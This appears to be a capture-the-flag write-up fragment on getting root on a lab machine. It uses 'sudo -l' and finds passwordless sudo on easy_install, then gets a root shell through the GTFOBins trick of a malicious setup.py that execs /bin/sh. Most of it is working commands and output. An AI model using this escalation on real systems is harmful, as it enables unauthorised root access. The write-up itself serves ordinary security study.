Land on the box as the developer user and see if this user can run any commands as a different user:
```bash
$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```
A binary that can be ran as root? GTFOBins angle...
![[Pasted image 20221022225538.png]]
Seems pretty easy...
```bash
$ TF=$(mktemp -d)
$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.Eoepkl0Igi
Writing /tmp/tmp.Eoepkl0Igi/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.Eoepkl0Igi/egg-dist-tmp-8LfOop
# id
uid=0(root) gid=0(root) groups=0(root)
```
Easiest root ever which makes up a bit for how impossible the foothold was
